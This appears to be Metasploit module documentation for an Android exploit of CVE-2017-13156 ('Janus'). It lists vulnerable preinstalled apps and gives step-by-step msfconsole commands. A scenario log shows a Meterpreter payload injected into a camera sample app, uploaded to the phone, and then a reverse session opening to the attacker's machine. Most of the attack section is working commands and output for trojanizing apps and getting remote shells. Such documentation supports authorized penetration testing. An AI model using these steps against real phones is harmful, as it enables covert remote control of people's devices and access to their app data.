## Description

This module exploits CVE-2017-13156 in Android to install a payload into another
application. The payload APK will have the same signature and can be installed
as an update, preserving the existing data.
The vulnerability was fixed in the 5th December 2017 security patch, and was
additionally fixed by the APK Signature scheme v2, so only APKs signed with
the v1 scheme are vulnerable.

## Confirmed Vulnerable Apps

The following table shows known vulnerable apps either pre-installed on a phone or available to download.

| Package                                 | Version        | From Phone                               | Size | MD5 |
|-----------------------------------------|----------------|------------------------------------------|------|-----|
| com.google.android.googlequicksearchbox |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |
| com.ume.browser.northamerica (Browser)  | v3.42.21161215 | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |
| com.phonegap.camerasample               |                |                                          |      |     |
| com.android.vending (Google play store) |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |
| com.apptap.appfinder.tracfone           |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |
| com.tracfone.generic.downloaderapp      |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |

## Hostile Apps

This table shows apps which seemed to work (injected, installed without error) but had adverse effects.  These apps
should typically be avoided unless tested.

| Package                                 | Version        | From Phone                               | Size | MD5 | Issue |
|-----------------------------------------|----------------|------------------------------------------|------|-----|-------|
| com.google.android.youtube              |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |       |
| com.android.launcher3                   |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |       |
| com.instagram.android                   |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |       |
| com.google.android.music                |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |       |
| com.google.android.apps.docs            |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |       |
| com.google.android.apps.maps            |                | Stock ZTE Z798BL Android 6.0.1 tracphone |      |     |       |



## Vulnerable Application

This module will only work on applications that are signed with only the v1 signature scheme. You can verify which signing scheme an APK is signed with using the `apksigner` tool in the Android SDK:

```
$ apksigner verify -verbose notvulnerable.apk
Verifies
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): true
Number of signers: 1

$ apksigner verify -verbose vulnerableapplication.apk
Verifies
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): false
Number of signers: 1
```

## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  4. Start a handler with `exploit/multi/handlers`
  5. Do: `use exploit/android/local/janus`
  6. Do: `set session [session]`
  7. Do: `check`
  8. Do: `run`
  9. On the phone, a new screen will ask about installing the updated app, say yes/ok, then open the app.
  10. You should get a new session.

## Options

  **PACKAGE**

  Select a package to infect.  A list of packages can be obtained by running `app_list` on meterpreter.  Using `ALL` will
  loop through all packages and attempt to exploit them until successful.  This can take a while, and cause lots of data to be
  transferred.  Default is `com.phonegap.camerasample`

## Scenarios

### com.phonegap.camerasample on Nexus 6p with November 2016 Security Patch

Install [com.phonegap.camerasample](https://github.com/heavysixer/phonegap-camera-sample/blob/master/bin/CameraSample.apk)

An `exploit/multi/handler` was started prior to exploitation.

```
msf5 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                        Information         Connection
  --  ----  ----                        -----------         ----------
  1         meterpreter dalvik/android  u0_a80 @ localhost  192.168.0.176:4444 -> 192.168.0.107:46059 (192.168.0.107)

msf5 exploit(multi/handler) > use exploit/android/local/janus
msf5 exploit(android/local/janus) > set PACKAGE com.phonegap.camerasample
PACKAGE => com.phonegap.camerasample
msf5 exploit(android/local/janus) > set SESSION 1
SESSION => 1
msf5 exploit(android/local/janus) > set LHOST 192.168.0.176
LHOST => 192.168.0.176
msf5 exploit(android/local/janus) > set LPORT 4445
LPORT => 4445
msf5 exploit(android/local/janus) > run

[*] Downloading APK: /data/app/com.phonegap.camerasample-1/base.apk
[*] Decompiling original APK..
[*] Decompiling payload APK..
[*] Locating hook point..
[*] Adding payload as package com.phonegap.camerasample.syerq
[*] Loading /tmp/d20190824-7164-qydvgj/original/smali/com/phonegap/camerasample/CameraSampleActivity.smali and injecting payload..
[*] Rebuilding apk with meterpreter injection as /tmp/d20190824-7164-qydvgj/output.apk
[*] Uploading APK: /sdcard/app.apk
[*] APK uploaded
msf5 exploit(android/local/janus) >
```
Please note that the user will need to manually accept the install prompt on the device (and also open the application) before a new session is opened.

```
[*] Sending stage (72609 bytes) to 192.168.0.107
[*] Meterpreter session 2 opened (192.168.0.176:4445 -> 192.168.0.107:49710) at 2018-10-01 17:44:50 +0800

msf5 exploit(android/local/janus) > sessions 2
[*] Starting interaction with 2...

meterpreter > pwd
/data/user/0/com.phonegap.camerasample/files

```


